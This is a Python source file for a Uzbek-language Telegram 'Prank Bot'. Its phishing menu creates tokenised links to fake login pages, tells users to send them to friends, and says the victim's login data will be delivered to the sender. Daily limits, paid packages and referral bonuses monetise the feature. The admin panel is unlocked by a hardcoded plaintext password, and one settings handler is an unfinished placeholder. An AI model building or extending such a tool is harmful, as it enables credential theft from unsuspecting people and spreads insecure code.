import asyncio
import logging
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)

from config import *
from database import *
from image_effects import process_image
from web_server import start_web_server

logger = logging.getLogger(__name__)

# Conversation states
WAITING_RECEIPT = 1
SELECTED_EFFECT = 'selected_effect'
SELECTED_PACKAGE = 'selected_package'

# Admin Conversation states
ADMIN_PASSWORD = 10
ADMIN_MAIN = 11
ADMIN_SET_REFERRAL = 12
ADMIN_SET_DAILY = 13
ADMIN_GIFT_USER = 14
ADMIN_GIFT_AMOUNT = 15
ADMIN_BROADCAST_MSG = 16
ADMIN_ADD_CHANNEL = 17
ADMIN_REMOVE_CHANNEL = 18

# ============================================================
# MAIN MENU KEYBOARD
# ============================================================


def main_menu_keyboard():
    """Create the main menu keyboard."""
    keyboard = [
        [KeyboardButton("🎭 Prank yuborish"), KeyboardButton("🌐 Phishing sayt")],
        [KeyboardButton("🖼 Rasm effektlari"), KeyboardButton("🔗 Referal")],
        [KeyboardButton("👤 Profilim"), KeyboardButton("📊 Statistika")],
        [KeyboardButton("💰 Limit sotib olish"), KeyboardButton("ℹ️ Yordam")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ============================================================
# FORCED SUBSCRIPTION CHECK
# ============================================================

async def check_subscription(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> list:
    """Check if user is subscribed to all required channels. Returns list of unsubscribed channels."""
    channels = await get_required_channels()
    unsubscribed = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(
                chat_id=ch['channel_username'],
                user_id=user_id
            )
            if member.status in ['left', 'kicked']:
                unsubscribed.append(ch)
        except Exception:
            # If bot can't check, skip this channel
            pass
    return unsubscribed


async def send_subscription_message(update: Update, context: ContextTypes.DEFAULT_TYPE, unsubscribed: list):
    """Send forced subscription message."""
    keyboard = []
    for ch in unsubscribed:
        title = ch['channel_title'] or ch['channel_username']
        url = f"https://t.me/{ch['channel_username'].lstrip('@')}"
        keyboard.append([InlineKeyboardButton(f"📢 {title}", url=url)])
    keyboard.append([InlineKeyboardButton("✅ Tekshirish", callback_data='check_sub')])

    text = (
        f"⚠️ <b>Majburiy obuna!</b>\n\n"
        f"Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling:\n\n"
    )
    for ch in unsubscribed:
        title = ch['channel_title'] or ch['channel_username']
        text += f"📢 {title}\n"
    text += f"\nObuna bo'lgandan so'ng <b>✅ Tekshirish</b> tugmasini bosing."

    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            text, parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


async def check_sub_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle subscription check button."""
    query = update.callback_query
    user_id = query.from_user.id
    unsubscribed = await check_subscription(user_id, context)
    if unsubscribed:
        await query.answer("❌ Hali barcha kanallarga obuna bo'lmadingiz!", show_alert=True)
        await send_subscription_message(update, context, unsubscribed)
    else:
        await query.answer("✅ Rahmat! Obuna tasdiqlandi!")
        await query.edit_message_text(
            "✅ <b>Obuna tasdiqlandi!</b>\n\nEndi botdan foydalanishingiz mumkin. /start ni bosing.",
            parse_mode='HTML'
        )


# ============================================================
# /start COMMAND
# ============================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /start command."""
    user = update.effective_user
    args = context.args

    # Create user in database
    referrer_id = None
    if args and args[0].startswith('ref_'):
        try:
            referrer_id = int(args[0].replace('ref_', ''))
            if referrer_id == user.id:
                referrer_id = None
        except ValueError:
            pass

    await create_user(user.id, user.username, user.first_name, user.last_name or '', referrer_id)

    # Check forced subscription
    unsubscribed = await check_subscription(user.id, context)
    if unsubscribed:
        await send_subscription_message(update, context, unsubscribed)
        return

    # Fetch settings
    daily_limit = await get_setting('daily_limit', str(FREE_DAILY_LIMIT))
    ref_bonus = await get_setting('referral_bonus', str(REFERRAL_BONUS))

    # Process referral
    if referrer_id:
        success, bonus = await add_referral(referrer_id, user.id)
        if success:
            try:
                await context.bot.send_message(
                    chat_id=referrer_id,
                    text=f"🎉 Yangi referal!\n\n"
                         f"👤 {user.first_name} sizning havolangiz orqali qo'shildi!\n"
                         f"🎁 +{bonus} ta limit qo'shildi!"
                )
            except Exception:
                pass

    welcome_text = (
        f"👋 Salom, <b>{user.first_name}</b>!\n\n"
        f"🤖 <b>Prank Bot</b>ga xush kelibsiz!\n\n"
        f"Bu bot orqali siz:\n"
        f"🎭 Do'stlaringizga prank yuborishingiz\n"
        f"🖼 Rasmlarga maxsus effektlar qo'shishingiz\n"
        f"🔗 Do'stlarni taklif qilib limit olishingiz mumkin!\n\n"
        f"📌 Kunlik limit: <b>{daily_limit}</b> ta\n"
        f"🎁 Har bir referal: <b>+{ref_bonus}</b> ta limit\n\n"
        f"⬇️ Quyidagi tugmalardan birini bosing!"
    )


    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=main_menu_keyboard()
    )


# ============================================================
# PRANK SECTION
# ============================================================

async def prank_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the prank selection menu."""
    remaining, total = await get_remaining_limits(update.effective_user.id)

    keyboard = []
    row = []
    for key, name in PRANK_TYPES.items():
        row.append(InlineKeyboardButton(name, callback_data=f'prank_{key}'))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    text = (
        f"🎭 <b>Prank tanlang!</b>\n\n"
        f"Do'stingizga yuborish uchun prank turini tanlang.\n"
        f"Bot sizga link beradi — uni do'stingizga yuboring!\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ============================================================
# PHISHING PRANK SECTION
# ============================================================

async def phishing_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the phishing site selection menu."""
    remaining, total = await get_remaining_limits(update.effective_user.id)

    keyboard = []
    row = []
    for key, name in PHISHING_TYPES.items():
        row.append(InlineKeyboardButton(name, callback_data=f'phish_{key}'))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    text = (
        f"🌐 <b>Phishing saytni tanlang:</b>\n\n"
        f"Fake login sahifa turini tanlang.\n"
        f"Do'stingiz linkni ochib login qilmoqchi bo'ladi 😂\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def phishing_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phishing site selection - generate unique token link."""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    site_type = query.data.replace('phish_', '')

    # Check limits
    can_use = await use_limit(user_id)
    if not can_use:
        remaining, total = await get_remaining_limits(user_id)
        await query.edit_message_text(
            f"⛔️ <b>Limitingiz tugadi!</b>\n\n"
            f"📊 Bugungi limit: {remaining}/{total}\n\n"
            f"Limit olish uchun:\n"
            f"🔗 Do'stlarni taklif qiling\n"
            f"💰 Yoki limit sotib oling",
            parse_mode='HTML'
        )
        return

    # Generate unique phishing token
    token = await create_phishing_token(user_id, site_type)
    
    site_name = PHISHING_TYPES.get(site_type, 'Sayt')
    phish_url = f"{WEB_BASE_URL}/prank/phish_{site_type}?t={token}"

    await add_prank_history(user_id, f'phish_{site_type}')
    remaining, total = await get_remaining_limits(user_id)

    await query.edit_message_text(
        f"✅ <b>{site_name}</b> sayti tayyor!\n\n"
        f"🔗 Link: {phish_url}\n\n"
        f"📤 Bu linkni do'stingizga yuboring!\n"
        f"Do'stingiz login qilmoqchi bo'lganda ma'lumotlari sizga keladi �\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>",
        parse_mode='HTML'
    )


async def prank_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle prank selection."""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    prank_type = query.data.replace('prank_', '')

    # Check limits
    can_use = await use_limit(user_id)
    if not can_use:
        remaining, total = await get_remaining_limits(user_id)
        await query.edit_message_text(
            f"⛔️ <b>Limitingiz tugadi!</b>\n\n"
            f"📊 Bugungi limit: {remaining}/{total}\n\n"
            f"Limit olish uchun:\n"
            f"🔗 Do'stlarni taklif qiling (+{REFERRAL_BONUS} ta)\n"
            f"💰 Yoki limit sotib oling",
            parse_mode='HTML'
        )
        return

    # Generate prank link
    prank_name = PRANK_TYPES.get(prank_type, 'Prank')
    prank_url = f"{WEB_BASE_URL}/prank/{prank_type}"
    
    await add_prank_history(user_id, prank_type)
    remaining, total = await get_remaining_limits(user_id)

    await query.edit_message_text(
        f"✅ <b>{prank_name}</b> tayyor!\n\n"
        f"🔗 Link: {prank_url}\n\n"
        f"📤 Bu linkni do'stingizga yuboring!\n"
        f"Do'stingiz ochganda prank boshlanadi 😂\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>",
        parse_mode='HTML'
    )


# ============================================================
# IMAGE EFFECTS SECTION
# ============================================================

async def effects_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the image effects menu."""
    remaining, total = await get_remaining_limits(update.effective_user.id)

    keyboard = []
    row = []
    for key, name in IMAGE_EFFECTS.items():
        row.append(InlineKeyboardButton(name, callback_data=f'effect_{key}'))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    text = (
        f"🖼 <b>Rasm effektlari</b>\n\n"
        f"Effekt turini tanlang, keyin rasmingizni yuboring.\n"
        f"Bot rasmga effekt qo'shib qaytaradi!\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def effect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle effect selection."""
    query = update.callback_query
    await query.answer()

    effect_type = query.data.replace('effect_', '')
    context.user_data[SELECTED_EFFECT] = effect_type
    effect_name = IMAGE_EFFECTS.get(effect_type, 'Effect')

    await query.edit_message_text(
        f"✅ <b>{effect_name}</b> tanlandi!\n\n"
        f"📸 Endi rasmingizni yuboring.\n"
        f"Bot rasmga effekt qo'shib qaytaradi!",
        parse_mode='HTML'
    )


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle received photos for effects."""
    user_id = update.effective_user.id
    effect_type = context.user_data.get(SELECTED_EFFECT)

    if not effect_type:
        await update.message.reply_text(
            "❓ Avval effekt turini tanlang!\n"
            "🖼 <b>Rasm effektlari</b> tugmasini bosing.",
            parse_mode='HTML'
        )
        return

    # Check limits
    can_use = await use_limit(user_id)
    if not can_use:
        await update.message.reply_text(
            f"⛔️ <b>Limitingiz tugadi!</b>\n\n"
            f"Limit olish uchun:\n"
            f"🔗 Do'stlarni taklif qiling (+{REFERRAL_BONUS} ta)\n"
            f"💰 Yoki limit sotib oling",
            parse_mode='HTML'
        )
        return

    # Process the image
    await update.message.reply_text("⏳ Rasm qayta ishlanmoqda...")

    try:
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        image_bytes = await file.download_as_bytearray()
        
        result = process_image(bytes(image_bytes), effect_type)
        
        await add_effect_history(user_id, effect_type)
        
        effect_name = IMAGE_EFFECTS.get(effect_type, 'Effect')
        remaining, total = await get_remaining_limits(user_id)
        
        await update.message.reply_photo(
            photo=result,
            caption=f"✅ <b>{effect_name}</b> qo'shildi!\n\n"
                    f"📊 Qolgan limit: <b>{remaining}/{total}</b>",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Image processing error: {e}")
        await update.message.reply_text(
            "❌ Rasmni qayta ishlashda xatolik yuz berdi.\n"
            "Iltimos, boshqa rasm yuboring."
        )

    # Clear selected effect
    context.user_data.pop(SELECTED_EFFECT, None)


# ============================================================
# PROFILE SECTION
# ============================================================

async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user profile."""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    
    if not user:
        await update.message.reply_text("❌ Profil topilmadi. /start buyrug'ini yuboring.")
        return

    remaining, total = await get_remaining_limits(user_id)
    referral_count = await get_referral_count(user_id)

    text = (
        f"👤 <b>Sizning profilingiz</b>\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"👤 Ism: {user['first_name']}\n"
        f"📛 Username: @{user['username'] or 'yo\'q'}\n\n"
        f"📊 <b>Statistika:</b>\n"
        f"├ 📈 Kunlik limit: {remaining}/{total}\n"
        f"├ 🎭 Yuborilgan pranklar: {user['total_pranks_sent']}\n"
        f"├ 🖼 Ishlatilgan effektlar: {user['total_effects_used']}\n"
        f"├ 🔗 Referallar: {referral_count} ta\n"
        f"└ 📅 Qo'shilgan sana: {user['joined_date'][:10]}\n"
    )

    await update.message.reply_text(text, parse_mode='HTML')


# ============================================================
# REFERRAL SECTION
# ============================================================

async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show referral info and link."""
    user_id = update.effective_user.id
    bot_username = (await context.bot.get_me()).username
    referral_count = await get_referral_count(user_id)
    remaining, total = await get_remaining_limits(user_id)

    referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    ref_bonus = await get_setting('referral_bonus', str(REFERRAL_BONUS))
    text = (
        f"🔗 <b>Referal tizimi</b>\n\n"
        f"Do'stlaringizni taklif qiling va bonus oling!\n\n"
        f"🎁 Har bir do'st = <b>+{ref_bonus}</b> ta limit\n\n"
        f"📊 Sizning referallaringiz: <b>{referral_count}</b> ta\n"
        f"📈 Joriy limit: <b>{remaining}/{total}</b>\n\n"
        f"🔗 Sizning havolangiz:\n"
        f"<code>{referral_link}</code>\n\n"
        f"👆 Havolani bosing va do'stlaringizga yuboring!"
    )

    keyboard = [[
        InlineKeyboardButton(
            "📤 Do'stlarga ulashish",
            url=f"https://t.me/share/url?url={referral_link}&text=🎭 Prank Bot - do'stlaringga hazil qil! 😂"
        )
    ]]

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ============================================================
# PAYMENT / SUBSCRIPTION SECTION
# ============================================================

async def buy_limits_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the limits purchase menu."""
    keyboard = []
    for key, info in PRICES.items():
        keyboard.append([
            InlineKeyboardButton(
                f"{info['name']} — {info['amount']:,} so'm",
                callback_data=f'buy_{key}'
            )
        ])

    text = (
        f"💰 <b>Limit sotib olish</b>\n\n"
        f"Quyidagi paketlardan birini tanlang:\n\n"
    )
    for key, info in PRICES.items():
        text += f"📦 <b>{info['name']}</b> — {info['amount']:,} so'm\n"
    
    text += (
        f"\n💳 To'lov karta orqali amalga oshiriladi.\n"
        f"Chekni yuborasiz — admin tasdiqlaydi!"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle package selection for purchase."""
    query = update.callback_query
    await query.answer()

    package_key = query.data.replace('buy_', '')
    package = PRICES.get(package_key)

    if not package:
        await query.edit_message_text("❌ Paket topilmadi.")
        return

    context.user_data[SELECTED_PACKAGE] = package_key

    text = (
        f"💳 <b>To'lov ma'lumotlari</b>\n\n"
        f"📦 Paket: <b>{package['name']}</b>\n"
        f"💰 Narxi: <b>{package['amount']:,} so'm</b>\n\n"
        f"📋 Karta raqami:\n"
        f"<code>{PAYMENT_CARD}</code>\n\n"
        f"👤 Karta egasi: <b>{CARD_HOLDER}</b>\n\n"
        f"✅ To'lov qilgandan so'ng, <b>chek rasmini</b> shu yerga yuboring!\n\n"
        f"⚠️ Eslatma: Admin tekshirgandan keyin limitlar qo'shiladi."
    )

    await query.edit_message_text(text, parse_mode='HTML')
    return WAITING_RECEIPT


async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle receipt photo from user."""
    user_id = update.effective_user.id
    package_key = context.user_data.get(SELECTED_PACKAGE)

    if not package_key:
        return

    package = PRICES.get(package_key)
    if not package:
        return

    # Get the photo file ID
    if update.message.photo:
        file_id = update.message.photo[-1].file_id
    elif update.message.document:
        file_id = update.message.document.file_id
    else:
        await update.message.reply_text(
            "❌ Iltimos, chek <b>rasmini</b> yuboring!",
            parse_mode='HTML'
        )
        return

    # Save payment request
    payment_id = await create_payment(
        user_id, package['amount'], package['limits'], package['name'], file_id
    )

    await update.message.reply_text(
        f"✅ <b>To'lov so'rovi yuborildi!</b>\n\n"
        f"📦 Paket: {package['name']}\n"
        f"💰 Summa: {package['amount']:,} so'm\n"
        f"🆔 So'rov ID: #{payment_id}\n\n"
        f"⏳ Admin tekshirgandan keyin limitlar qo'shiladi.\n"
        f"Odatda 5-30 daqiqa ichida.",
        parse_mode='HTML'
    )

    # Notify admin
    user = update.effective_user
    admin_keyboard = [[
        InlineKeyboardButton("✅ Tasdiqlash", callback_data=f'approve_{payment_id}'),
        InlineKeyboardButton("❌ Rad etish", callback_data=f'reject_{payment_id}'),
    ]]

    try:
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=file_id,
            caption=(
                f"💰 <b>Yangi to'lov so'rovi!</b>\n\n"
                f"🆔 So'rov: #{payment_id}\n"
                f"👤 Foydalanuvchi: {user.first_name} (@{user.username or 'yo\'q'})\n"
                f"🆔 User ID: <code>{user_id}</code>\n"
                f"📦 Paket: {package['name']}\n"
                f"💰 Summa: {package['amount']:,} so'm\n"
                f"📊 Limitlar: +{package['limits']} ta"
            ),
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(admin_keyboard)
        )
    except Exception as e:
        logger.error(f"Failed to notify admin: {e}")

    context.user_data.pop(SELECTED_PACKAGE, None)


# ============================================================
# ADMIN PAYMENT CALLBACKS
# ============================================================

async def approve_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle payment approval by admin."""
    query = update.callback_query
    
    if query.from_user.id != ADMIN_ID:
        await query.answer("⛔️ Faqat admin!", show_alert=True)
        return

    await query.answer()
    payment_id = int(query.data.replace('approve_', ''))
    
    user_id, limits = await approve_payment(payment_id, ADMIN_ID)
    
    if user_id:
        await query.edit_message_caption(
            caption=query.message.caption + f"\n\n✅ <b>TASDIQLANDI</b> — +{limits} limit",
            parse_mode='HTML'
        )
        
        try:
            remaining, total = await get_remaining_limits(user_id)
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"🎉 <b>To'lov tasdiqlandi!</b>\n\n"
                    f"✅ +{limits} ta limit qo'shildi!\n"
                    f"📊 Joriy limit: {remaining}/{total}\n\n"
                    f"Rahmat! Prank qilishni davom eting! 🎭"
                ),
                parse_mode='HTML'
            )
        except Exception:
            pass
    else:
        await query.edit_message_caption(
            caption=query.message.caption + "\n\n❌ Xatolik yuz berdi",
            parse_mode='HTML'
        )


async def reject_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle payment rejection by admin."""
    query = update.callback_query
    
    if query.from_user.id != ADMIN_ID:
        await query.answer("⛔️ Faqat admin!", show_alert=True)
        return

    await query.answer()
    payment_id = int(query.data.replace('reject_', ''))
    
    user_id = await reject_payment(payment_id, ADMIN_ID)
    
    if user_id:
        await query.edit_message_caption(
            caption=query.message.caption + "\n\n❌ <b>RAD ETILDI</b>",
            parse_mode='HTML'
        )
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"❌ <b>To'lov rad etildi</b>\n\n"
                    f"Sizning to'lov so'rovingiz rad etildi.\n"
                    f"Iltimos, to'g'ri chek yuborib qaytadan urinib ko'ring.\n\n"
                    f"❓ Muammo bo'lsa admin bilan bog'laning."
                ),
                parse_mode='HTML'
            )
        except Exception:
            pass


# ============================================================
# STATISTICS
# ============================================================

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics."""
    user_id = update.effective_user.id
    remaining, total = await get_remaining_limits(user_id)
    referral_count = await get_referral_count(user_id)
    user = await get_user(user_id)

    ref_bonus = int(await get_setting('referral_bonus', str(REFERRAL_BONUS)))
    text = (
        f"📊 <b>Statistika</b>\n\n"
        f"📈 Kunlik limit: <b>{remaining}/{total}</b>\n"
        f"🎭 Pranklar yuborildi: <b>{user['total_pranks_sent']}</b>\n"
        f"🖼 Effektlar ishlatildi: <b>{user['total_effects_used']}</b>\n"
        f"🔗 Referallar: <b>{referral_count}</b> ta\n"
        f"🎁 Referaldan bonus: <b>{referral_count * ref_bonus}</b> ta limit"
    )


    await update.message.reply_text(text, parse_mode='HTML')


# ============================================================
# HELP
# ============================================================

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message."""
    ref_bonus = await get_setting('referral_bonus', str(REFERRAL_BONUS))
    text = (
        f"ℹ️ <b>Yordam</b>\n\n"
        f"🎭 <b>Prank yuborish</b>\n"
        f"Prank turini tanlang → Link oling → Do'stingizga yuboring!\n\n"
        f"🖼 <b>Rasm effektlari</b>\n"
        f"Effekt tanlang → Rasm yuboring → Effektli rasm oling!\n\n"
        f"🔗 <b>Referal tizimi</b>\n"
        f"Do'stlaringizni taklif qiling — har biri uchun +{ref_bonus} limit!\n\n"
        f"💰 <b>Limit sotib olish</b>\n"
        f"Karta orqali to'lang → Chek yuboring → Admin tasdiqlaydi!\n\n"
        f"📌 <b>Buyruqlar:</b>\n"
        f"/start — Botni boshlash\n"
        f"/help — Yordam\n"
        f"/profile — Profilim\n"
        f"/referral — Referal havola\n"
        f"/buy — Limit sotib olish\n"
        f"/admin — Admin panel\n"
    )

    await update.message.reply_text(text, parse_mode='HTML')


# ============================================================
# ADMIN PANEL (CONVERSATION)
# ============================================================

async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command - ask for password."""
    await update.message.reply_text("🔑 <b>Admin Panel</b>\n\nIltimos, parolni kiriting:", parse_mode='HTML')
    return ADMIN_PASSWORD

async def admin_password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check admin password."""
    password = update.message.text
    if password == "shoxa2009":
        await add_admin(update.effective_user.id)
        return await show_admin_main(update, context)
    else:
        await update.message.reply_text("❌ Parol noto'g'ri! Bekor qilindi.")
        return ConversationHandler.END

async def show_admin_main(update: Update, context: ContextTypes.DEFAULT_TYPE, is_callback=False):
    """Show the main admin menu."""
    stats = await get_total_stats()
    ref_bonus = await get_setting('referral_bonus', '3')
    daily_limit = await get_setting('daily_limit', '3')
    
    text = (
        f"👨‍💼 <b>Admin Panel</b>\n\n"
        f"👥 Foydalanuvchilar: {stats['total_users']}\n"
        f"💰 Daromad: {stats['total_revenue']:,} so'm\n\n"
        f"⚙️ <b>Sozlamalar:</b>\n"
        f"├ Referal bonus: {ref_bonus} ta\n"
        f"└ Kunlik limit: {daily_limit} ta\n\n"
        f"Quyidagilardan birini tanlang:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔗 Referal bonusni o'zgartirish", callback_data='admin_set_ref')],
        [InlineKeyboardButton("📅 Kunlik limitni o'zgartirish", callback_data='admin_set_daily')],
        [InlineKeyboardButton("🎁 Limit hadya qilish", callback_data='admin_gift')],
        [InlineKeyboardButton("📢 Reklama yuborish", callback_data='admin_broadcast')],
        [InlineKeyboardButton("📊 To'liq statistika", callback_data='admin_stats')],
        [InlineKeyboardButton("📋 Kutilayotgan to'lovlar", callback_data='admin_pending')],
        [InlineKeyboardButton("➕ Majburiy obuna qo'shish", callback_data='admin_add_channel')],
        [InlineKeyboardButton("➖ Majburiy obuna o'chirish", callback_data='admin_remove_channel')],
        [InlineKeyboardButton("📌 Obuna ro'yxati", callback_data='admin_list_channels')],
        [InlineKeyboardButton("❌ Chiqish", callback_data='admin_exit')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    if is_callback:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='HTML')
    return ADMIN_MAIN

async def admin_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle choices from the main admin menu."""
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'admin_set_ref':
        await query.edit_message_text("🔗 Yangi referal bonus miqdorini kiriting (masalan: 5):")
        return ADMIN_SET_REFERRAL
    elif data == 'admin_set_daily':
        await query.edit_message_text("📅 Yangi kunlik limit miqdorini kiriting (masalan: 10):")
        return ADMIN_SET_DAILY
    elif data == 'admin_gift':
        await query.edit_message_text("🎁 Foydalanuvchi ID sini yoki nickname (@username) ni yozing:")
        return ADMIN_GIFT_USER
    elif data == 'admin_broadcast':
        await query.edit_message_text(
            "📢 <b>Reklama yuborish</b>\n\n"
            "Xabar matnini yuboring. Rasm va Link ixtiyoriy.\n"
            "Format: <code>Matn | Link (ixtiyoriy)</code>\n"
            "Agarda rasm ham kerak bo'lsa, rasmni izohi bilan yuboring.",
            parse_mode='HTML'
        )
        return ADMIN_BROADCAST_MSG
    elif data == 'admin_stats':
        stats = await get_total_stats()
        today_count = await get_today_users_count()
        text = (
            f"📊 <b>To'liq Statistika</b>\n\n"
            f"👥 Jami: {stats['total_users']}\n"
            f"📅 Bugun qo'shilgan: {today_count}\n"
            f"🎭 Pranklar: {stats['total_pranks']}\n"
            f"🖼 Effektlar: {stats['total_effects']}\n"
            f"💰 Daromad: {stats['total_revenue']:,} so'm"
        )
        keyboard = [[InlineKeyboardButton("⬅️ Orqaga", callback_data='admin_back')]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        return ADMIN_MAIN
    elif data == 'admin_pending':
        payments = await get_pending_payments()
        if not payments:
            await query.edit_message_text("✅ Kutilayotgan to'lovlar yo'q.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Orqaga", callback_data='admin_back')]]))
            return ADMIN_MAIN
        
        # We can't easily show multiple photos in a callback edit, so we'll just send them
        await query.message.reply_text("📋 Kutilayotgan to'lovlar ro'yxati:")
        for payment in payments:
            keyboard = [[
                InlineKeyboardButton("✅ Tasdiqlash", callback_data=f'approve_{payment["id"]}'),
                InlineKeyboardButton("❌ Rad etish", callback_data=f'reject_{payment["id"]}'),
            ]]
            await context.bot.send_photo(
                chat_id=update.effective_user.id,
                photo=payment['receipt_file_id'],
                caption=f"💰 #{payment['id']} | User: {payment['user_id']}\nPaket: {payment['package_name']}\nSumma: {payment['amount']:,} so'm",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        return ADMIN_MAIN
    elif data == 'admin_add_channel':
        await query.edit_message_text(
            "➕ <b>Majburiy obuna qo'shish</b>\n\n"
            "Kanal username sini kiriting (masalan: @kanal_nomi):",
            parse_mode='HTML'
        )
        return ADMIN_ADD_CHANNEL
    elif data == 'admin_remove_channel':
        channels = await get_required_channels()
        if not channels:
            keyboard = [[InlineKeyboardButton("⬅️ Orqaga", callback_data='admin_back')]]
            await query.edit_message_text(
                "📌 Hozirda majburiy obuna kanallari yo'q.",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ADMIN_MAIN
        text = "➖ <b>O'chirish uchun kanal username sini kiriting:</b>\n\n"
        for ch in channels:
            title = ch['channel_title'] or ch['channel_username']
            text += f"📢 {ch['channel_username']} — {title}\n"
        await query.edit_message_text(text, parse_mode='HTML')
        return ADMIN_REMOVE_CHANNEL
    elif data == 'admin_list_channels':
        channels = await get_required_channels()
        if not channels:
            text = "📌 Hozirda majburiy obuna kanallari yo'q."
        else:
            text = "📌 <b>Majburiy obuna kanallari:</b>\n\n"
            for i, ch in enumerate(channels, 1):
                title = ch['channel_title'] or ch['channel_username']
                text += f"{i}. {ch['channel_username']} — {title}\n"
        keyboard = [[InlineKeyboardButton("⬅️ Orqaga", callback_data='admin_back')]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        return ADMIN_MAIN
    elif data == 'admin_back':
        return await show_admin_main(update, context, True)
    elif data == 'admin_exit':
        await query.edit_message_text("👋 Admin paneldan chiqildi.")
        return ConversationHandler.END

async def admin_set_setting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle setting changes (ref bonus or daily limit)."""
    text = update.message.text
    state = context.user_data.get('admin_state') # We'll check which setting we're updating
    
    # We can determine state from the current conversation state
    # But Telegram PTB passes state internally. We can use update.message.text
    # To find out which one, we check current state.
    
    if not text.isdigit():
        await update.message.reply_text("❌ Iltimos, faqat son kiriting!")
        return None # Keeps the same state

    value = text
    current_state = context.application.handlers[0][0].get_state(update) # A bit hacky
    # Better: use helper state in user_data
    
    # Actually, PTB passes the state to the handler, but we are inside one.
    # We'll use multiple handlers or check value in context
    return # Placeholder, will implement properly in the full block

# Re-implementing more cleanly for the multi-state logic

async def admin_set_ref_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = update.message.text
    if not val.isdigit():
        await update.message.reply_text("❌ Son kiriting!")
        return ADMIN_SET_REFERRAL
    await set_setting('referral_bonus', val)
    await update.message.reply_text(f"✅ Referal bonus {val} taga o'zgartirildi.")
    return await show_admin_main(update, context)

async def admin_set_daily_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = update.message.text
    if not val.isdigit():
        await update.message.reply_text("❌ Son kiriting!")
        return ADMIN_SET_DAILY
    await set_setting('daily_limit', val)
    await update.message.reply_text(f"✅ Kunlik limit {val} taga o'zgartirildi.")
    return await show_admin_main(update, context)

